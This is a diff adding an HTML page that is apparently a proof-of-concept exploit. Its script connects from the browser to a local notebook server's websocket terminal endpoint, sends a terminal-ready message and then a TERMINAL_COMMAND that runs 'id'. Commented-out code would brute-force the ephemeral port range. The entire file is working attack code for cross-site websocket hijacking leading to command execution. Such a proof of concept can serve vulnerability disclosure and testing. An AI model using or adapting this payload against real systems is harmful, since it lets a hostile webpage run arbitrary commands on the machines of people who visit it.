@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Websocket Client</title>
+</head>
+<body>
+<h1>Websocket Client</h1>
+<div id="out"></div>
+<script>
+  let outputDiv = document.getElementById('out');
+
+  // let ip = '192.168.40.81';
+  let ip = 'localhost';
+  /*
+   * Experiments creating a ServerSocket 100000 times with:
+   * ServerSocket socket = new ServerSocket(0)
+   * resulted in a max port range of ~50000 - 65535
+   */
+  // let ports = [57020, 57020]
+  let targetPort = 53319;
+  // Set a specific port to disable bruteforce
+  // let port = null;
+  // let portRange = port ? [port, port] : ports;
+  let timeout = 150;
+  let socket = null;
+  let cmd = false;
+
+  function init() {
+    // let port = portRange[0];
+    let offset = 0;
+    // while (!socket && !cmd && port <= portRange[1]) {
+    //   setTimeout(wrapper, offset, port, offset, port === portRange[1]);
+    //   offset += timeout;
+    //   port++;
+    // }
+
+    wrapper(targetPort, offset, true)
+  }
+
+  function wrapper(port, offset, isLast) {
+    makeWsClient(ip, port, timeout, offset).then((s) => {
+      socket = s;
+      socket.onmessage = function (event) {
+        if (event.data) {
+          log(`[poc] Got message from server: ${event.data}`);
+        }
+        if (!cmd) {
+          socket.send(JSON.stringify({
+            type: 'TERMINAL_COMMAND',
+            command: 'id\n',
+          }));
+          cmd = true;
+        }
+      };
+      socket.send(JSON.stringify({
+        type: 'TERMINAL_READY',
+        noteId: 'XXX',
+        paragraphId: 'YYY'
+      }));
+    }).catch((e) => {
+      console.error(e);
+      if (isLast) {
+        log(`[error] Could not connect to port: ${port}`, true);
+      }
+    })
+  }
+
+  function makeWsClient(ip, port, timeout, offset) {
+    let wsHost = `ws://${ip}:${port}/terminal/`;
+
+    return new Promise((resolve, reject) => {
+      let socket = new WebSocket(wsHost);
+      // let total = portRange[1] - portRange[0];
+      // let index = total - (portRange[1] - port);
+      // console.log(`[${index + 1}/${total} - ${((index / total) * 100).toFixed(2)}% - ${Date.now()}] Trying port: ${port}`)
+      console.log(`Trying port: ${port}`);
+      let tid = null;
+
+      socket.onopen = function(event) {
+        log(`[open] Connection established with host: ${wsHost}`);
+        clearTimeout(tid);
+        resolve(socket)
+      };
+      socket.onclose = function () {
+        reject();
+      };
+      socket.onerror = function () {
+        reject();
+      };
+
+      tid = setTimeout(function () {
+        socket.close();
+        reject();
+      }, timeout + offset);
+    });
+  }
+
+  function log(msg, err = false, data = {}) {
+    if (!err) {
+      console.log(msg, data);
+    } else {
+      console.error(msg, data);
+    }
+    if (outputDiv) {
+      outputDiv.innerText += msg + "\n";
+    }
+  }
+
+  setTimeout(init, 500);
+</script>
+</body>
+</html>
